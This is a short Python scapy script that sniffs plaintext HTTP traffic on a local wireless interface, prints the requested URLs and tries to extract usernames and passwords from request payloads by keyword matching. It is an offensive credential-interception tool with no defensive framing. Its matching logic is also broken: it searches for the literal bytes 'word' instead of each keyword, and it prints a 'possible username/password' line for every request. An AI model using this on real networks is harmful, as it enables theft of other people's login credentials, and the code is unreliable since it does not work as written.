#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


# created by Wambugu
# 01-09-2022

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        words = ["Username", "user", "username",  "uname", "login", "Password", "password", "pass"]
        for word in words:
            if b'word' in load:
                return load


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(get_url(packet))
        print("[+] HTTP Request > " + url)

        login_info = str(get_login_info(packet))
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("wlo1")
